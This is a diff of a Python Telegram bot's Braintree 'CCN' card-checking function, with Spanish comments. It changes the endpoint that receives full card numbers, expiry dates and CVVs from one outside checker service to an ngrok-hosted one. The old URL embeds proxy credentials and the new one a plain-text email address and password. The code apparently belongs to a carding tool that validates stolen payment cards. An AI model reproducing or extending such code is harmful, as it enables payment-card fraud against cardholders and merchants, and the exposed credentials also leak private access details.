@@ -81,7 +81,7 @@ def process_braintree_ccn(bot, message):
         processing_msg = bot.reply_to(message, "🔄 Procesando tu tarjeta en Braintree...")
         
         # URL CORREGIDA para Braintree CCN
-        braintree_url = f"https://diwazz-b3.onrender.com/ccn?key=diwazz&cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&proxy=p.webshare.io:80:bhiyynnu-rotate:hq37ts3k50kz"
+        braintree_url = f"https://componential-unstruggling-shantel.ngrok-free.dev//check_cc?cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&email=wasdark336@gmail.com&password=bbmEZs65p!BJLNz"
         
         # Hacer la solicitud simple con requests
         start_time = time.time()
